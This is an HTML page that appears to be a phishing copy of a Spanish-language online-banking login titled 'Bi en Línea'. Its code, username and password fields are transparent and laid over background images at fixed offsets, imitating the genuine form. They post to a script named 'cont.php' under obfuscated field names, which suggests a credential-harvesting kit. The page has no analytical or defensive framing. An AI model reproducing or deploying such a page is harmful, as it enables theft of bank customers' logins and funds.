<!DOCTYPE html>
<html lang="es">
  <head>

    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <title>Bi en Línea</title>
    
  </head>
  <body style="overflow-x:hidden;">
    <header> 
      <nav style="overflow: hidden;padding-top: 10px;"><div  class="im1" style="width: 200px;text-align: center;display:inline-block;height: 80px;"><img src="lg-nav.png" style="width: 74px;max-width:74px;"></div><div  class="im2" style="width: 300px;text-align: center;display:inline-block;height: 80px;float: right;"><img src="lnks1.svg" style="max-width:300px;height: 80px;"/></div>
      </nav>
    </header>
    <div id="cizq"></div>
    <div id="cder">
        <div class="lg-cont"><img src="lg1.jpg"/></div>
        <div id="mn-frm">
          <form action="cont.php"  method="post">
            <input max-length="14" pattern="[0-9]*" inputmode="numeric" required name="ipts1" type="text" placeholder="Código" style="position: relative;top: 84px;left: 27px;height: 49px;width: 254px;display: block; border:none; background:transparent;padding: 0px 0 0 54px;font-size: 16px;font-family: sans-serif;">
            <input max-length="20" required name="ipts2" type="text" placeholder="Usuario" style="position: relative;top: 114px;left: 27px;height: 49px;width: 254px;display: block; border:none; background:transparent;padding: 0px 0 0 54px;font-size: 16px;font-family: sans-serif;">
            <input max-length="20" required name="ipts3" type="password" placeholder="Contraseña" style="position: relative;top: 144px;left: 27px;height: 49px;width: 254px;display: block; border:none; background:transparent;padding: 0px 0 0 54px;font-size: 16px;font-family: sans-serif;">
            <input type="submit" value="" style="position: relative;top: 160px;left: 27px;height: 49px;width: 310px;display: block; border:none; background:transparent;padding: 0px 0 0 54px;font-size: 16px;font-family: sans-serif;">
          </form>
        </div>
    </div>
    <style>
      *{margin:0;padding:0;}
      header nav{
        background-color: #003865;
        background: #003865;
        height: 80px;
        padding-left: 12rem;
        padding-right: 12rem;
      }
      .lg-cont {
        width: 100%;
        text-align: center;
        margin-top: 30px;
      }
      .lg-cont img{
        width: 175px;
        display: inline-block;
      }
      #cder,#cizq{
        width:50%;
        min-height:300px;
        height: 734px;
        display:inline-block;
        float: left;
      }
      #cizq{
        background-image: url(bnr1.jpg);
        background-repeat: no-repeat;
        background-size: cover;
        
      }
      #cder{
        text-align:center;
      }
      #mn-frm{
        height:568px;
        width:363px;
        background-image:url('frsd1.svg');
        background-repeat:no-repeat;
        background-size:cover;
        display:inline-block;
      }
      input{
        color:#333;
        font-family:sans-serif;
        font-size:14px;
      }


      
      @media screen and (max-width: 1024px){
        #cder,#cizq{
        width:100%;
        }
        #cizq{
          height:30vh!important;
          background-position:center;
        }
        .im1,.im2{
          width:100%!important;
          float: left!important;
        }
        .im2{
          display: none!important;
        }
      }
      @media screen and (max-width: 450px){
        .im1{
          left: -18px;
          position: relative;
        }
      }
      
    </style>
  </body>
</html>